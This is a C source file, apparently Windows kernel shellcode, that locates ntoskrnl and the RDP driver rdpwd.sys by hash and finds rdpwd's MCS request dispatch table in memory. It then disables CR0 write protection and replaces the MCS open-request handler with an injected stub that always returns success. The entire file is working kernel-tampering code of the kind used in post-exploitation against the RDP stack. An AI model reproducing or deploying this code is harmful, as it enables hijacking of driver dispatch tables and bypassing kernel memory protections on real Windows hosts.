/*
 * Copyright (c) 2020 Austin Hudson
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIEDi
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include <ntstatus.h>
#include "pe_util.h"
#include "hs_util.h"
#include "winapi.h"
#include "hashes.h"

#define PTR(x) ((ULONG_PTR)x)
#define RV2OFF(Base, Rva)(((ULONG_PTR)Base) + Rva) 
#define NT_HDR(x) (PIMAGE_NT_HEADERS)\
(RV2OFF(x, ((PIMAGE_DOS_HEADER)x)->e_lfanew))
#define INDEX_MCS_OPEN_REQUEST 39

static inline 
__attribute__((always_inline))
VOID DisableWriteProtection()
{
	__asm__ __volatile__ ( "cli\n" );
	__writecr0(__readcr0() & (~(1 << 16)));
};

static inline
__attribute__((always_inline))
VOID EnableWriteProtection()
{
	__writecr0(__readcr0() | (1 << 16));
	__asm__ __volatile__ ( "sti\n" );
};

static inline
__attribute__((always_inline))
VOID Memcpy_Inline(PVOID Dst, PVOID Src, SIZE_T Length)
{
	LPVOID D = Dst;
	LPVOID S = Src;
	SIZE_T L = Length;

	do {
		*(BYTE *)D++ = *(BYTE *)S++;
	} while ( L-- != 0 ) ;
};

INT WindowsEntrypoint()
{
  struct Functions Func = { 0 };
  struct Drivers   Drvs = { 0 };

  Drvs.NtosKrnlBase = GetPeBase(HASH_NTOSKRNL);
  Drvs.RdpwdBase    = GetPeBase(HASH_RDPWD);

  if (( Drvs.NtosKrnlBase != NULL ) && 
      ( Drvs.RdpwdBase    != NULL ))
  {
    LPVOID           *ReqTbl = NULL;
    LPVOID            SecEnd = NULL;
    SIZE_T            SecLen = 0;

    SecEnd = GetPeSect(Drvs.RdpwdBase, HASH_TEXT, &SecLen);
    SecEnd = (LPVOID)(PTR(SecEnd) + SecLen);
    ReqTbl = GetPeSect(Drvs.RdpwdBase, HASH_RDATA, NULL);

    for ( ;; ) {
      if ( (PTR(Drvs.RdpwdBase) < PTR(ReqTbl[0])) &&
	   (PTR(ReqTbl[0])      < PTR(SecEnd))    &&
	   (PTR(Drvs.RdpwdBase) < PTR(ReqTbl[1])) &&
	   (PTR(ReqTbl[1])      < PTR(SecEnd))    &&
	   (PTR(ReqTbl[2])     != PTR(ReqTbl[3])) &&
	   (PTR(ReqTbl[4])     == PTR(ReqTbl[5])) &&
	   (PTR(ReqTbl[6])     == PTR(NULL)) )
      {
	      goto FoundTableEntrypoint;
      };
      ReqTbl++;
    };

    NTSTATUS McsDispatchHook()
    { 
	    return STATUS_SUCCESS; 
    };
    VOID McsDispatchHook_End() { };

FoundTableEntrypoint:

    Func.ExAllocatePool = GetPeFunc(Drvs.NtosKrnlBase, HASH_EXALLOCATEPOOL);
    
    SIZE_T LengthOfFunction = PTR(&McsDispatchHook_End) - PTR(&McsDispatchHook);
    LPVOID FunctionPoolPtr  = Func.ExAllocatePool(0, LengthOfFunction);
    Memcpy_Inline(FunctionPoolPtr, &McsDispatchHook, LengthOfFunction);

    DisableWriteProtection(); 
    ReqTbl[INDEX_MCS_OPEN_REQUEST] = (LPVOID)FunctionPoolPtr; 
    EnableWriteProtection();
  };

  return 0;
};
